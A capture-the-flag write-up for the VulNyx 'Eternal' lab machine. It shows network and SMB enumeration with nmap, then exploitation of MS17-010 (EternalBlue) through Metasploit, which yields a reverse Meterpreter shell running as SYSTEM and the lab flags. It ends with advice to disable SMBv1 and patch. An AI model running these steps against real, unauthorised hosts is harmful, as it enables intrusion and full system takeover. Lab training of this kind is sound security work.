# [VulNyx](https://vulnyx.com/): Eternal Writeup  

<img width="671" height="426" alt="Screenshot 2026-05-28 154656" src="https://github.com/user-attachments/assets/8b266336-3219-49c8-abde-8e017c7e647f" />

---

# 🎯 Target Information

- **Platform:** VulNyx.com
- **Machine Name:** Eternal  
 
- **Key Vulnerabilities:**
  - SMBv1 Remote Code Execution
  - MS17-010 (EternalBlue)
  - Outdated Windows 7 System
  - Remote SYSTEM-Level Access

---

# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet
```

## Result

```bash
$ sudo arp-scan  --localnet               
[sudo] password for arc: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 172.29.112.76
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.29.112.73   00:0c:29:23:e7:0a       (Unknown)
172.29.112.109  fe:f7:e9:58:e3:54       (Unknown: locally administered)

2 packets received by filter, 0 packets dropped by kernel
Endi
```

The target machine IP address was identified as:

```text
172.29.112.73
```

---

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
nmap -n -Pn -sS -p- --min-rate 5000 172.29.112.73
```

## Scan Results

```text
$ nmap -n -Pn -sS  -p- --min-rate 5000   172.29.112.73                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 02:28 -0700
Nmap scan report for 172.29.112.73
Host is up (0.048s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 00:0C:29:23:E7:0A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds

```

### Findings
- SMB service running on port **445**
- Multiple RPC services exposed
- Target appears to be a Windows machine

The SMB service was the most interesting attack surface.

---

# 🔍 Service Enumeration

Enumerate service versions using Nmap:

```bash
nmap -sVC -p 135,139,445,5357,49152,49153,49154,49155,49156,49157 172.29.112.73
```

## Result

```text
$ nmap -sVC -p 135,139,445,5357,49152,49153,49154,49155,49156,49157 172.29.112.73 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 02:29 -0700
Nmap scan report for 172.29.112.73
Host is up (0.0014s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:23:E7:0A (VMware)
Service Info: Host: MIKE-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-28T11:30:52+02:00
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-28T09:30:52
|_  start_date: 2026-05-28T09:24:43
|_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:23:e7:0a (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.99 seconds
```

### Additional Information

```text
Computer Name: MIKE-PC
OS: Windows 7 Enterprise SP1
Workgroup: WORKGROUP
```

### Important Findings
- Windows 7 Enterprise SP1
- SMB signing disabled
- SMBv1 enabled

These characteristics strongly suggested the possibility of the **MS17-010** vulnerability.

---

# ⚠️ Vulnerability Scanning

Use the Nmap `vuln` scripts to identify known vulnerabilities:

```bash
nmap --script=vuln -p 135,139,445,5357,49152,49153,49154,49155,49156,49157 172.29.112.73
```

## Result

```text
$ nmap --script=vuln -p 135,139,445,5357,49152,49153,49154,49155,49156,49157 172.29.112.73 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 02:33 -0700
Host is up (0.00067s latency).

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 00:0C:29:23:E7:0A (VMware)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-att
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 110.55 seconds

```

### Vulnerability Details

```text
CVE: CVE-2017-0143
Risk: HIGH
```

### Explanation
The target is vulnerable to **MS17-010**, also known as:

```text
EternalBlue
```

This vulnerability allows unauthenticated remote code execution through the SMBv1 protocol.

---

# 🚀 Exploitation with Metasploit

Start Metasploit:

```bash
msfconsole 
```

Search for the EternalBlue exploit module:

```bash
search ms17-010
```

```text
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .

Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```

## Selected Module
Load the exploit:
```bash
use 0
```
or
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

# ⚙️ Configure Exploit

View available options:

```bash
show options
```
```

msf exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
                                             loit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
                                             t machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win
                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve
                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):
```

Set the target IP address:

```bash
set RHOSTS 172.29.112.73
```

The default payload used:

```text
windows/x64/meterpreter/reverse_tcp
```

---

# 💣 Exploitation

Run the exploit:

```bash
exploit
```
or
```bash
run
```

## Result

```text
[*] Meterpreter session 1 opened (172.29.112.76:4444 -> 172.29.112.73:49159) at 2026-05-28 02:36:42 -0700
[+] 172.29.112.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.29.112.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.29.112.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

Successfully gained a Meterpreter session.

---

# 🖥 SYSTEM Shell Access

Spawn a Windows command shell:

```bash
shell
```

## Verify Privileges

```cmd
whoami
```

## Result

```text
meterpreter > shell 
Process 884 created.
Channel 1 created.
Microsoft Windows [Versiï¿½n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Windows\system32>whoami
whoami
nt authority\system

```

Successfully gained SYSTEM-level access.

---

# 📂 Navigating to User Desktop

Navigate to the desktop directory:

```bash
cd Users/MIKE/Desktop
```

Verify current directory:

```bash
meterpreter > pwd
C:\Users\MIKE\Desktop
```

List files:

```bash
ls
```

## Result

```text
meterpreter > ls
Listing: C:\Users\MIKE\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2024-02-03 03:47:39 -0800  desktop.ini
100666/rw-rw-rw-  35    fil   2024-02-03 03:50:56 -0800  root.txt
100666/rw-rw-rw-  35    fil   2024-02-03 03:50:08 -0800  user.txt

```

---

# 🏁 Flags

## 📄 User Flag

```bash
cat user.txt
```

```text
c4fa8bfbc9855acfced6a5**********
```

---

## 👑 Root Flag

```bash
cat root.txt
```

```text
1682c7160e3855a6685316**********
```

---

# 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| SMB Enumeration | SMBv1 Analysis |
| Vulnerability Detection | MS17-010 |
| Exploitation | EternalBlue |
| Initial Access | Meterpreter |
| Privilege Level | NT AUTHORITY\SYSTEM |

---

# 🚀 Key Takeaways

- SMBv1 is highly insecure and should always be disabled.
- Windows 7 systems without security patches remain vulnerable to EternalBlue.
- MS17-010 allows unauthenticated remote code execution.
- Metasploit provides reliable exploitation modules for legacy SMB vulnerabilities.
- Gaining `NT AUTHORITY\SYSTEM` provides complete control over the target machine.

---

# 📚 About EternalBlue (MS17-010)

EternalBlue is a critical Remote Code Execution vulnerability affecting Microsoft SMBv1 servers. It was publicly disclosed in 2017 and later weaponized in major ransomware attacks such as WannaCry.

The vulnerability exists because of improper handling of specially crafted SMB packets, allowing attackers to execute arbitrary code remotely without authentication.

### Vulnerability Details

| Field | Value |
|------|------|
| Vulnerability | MS17-010 |
| CVE | CVE-2017-0143 |
| Protocol | SMBv1 |
| Impact | Remote Code Execution |
| Authentication Required | No |

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
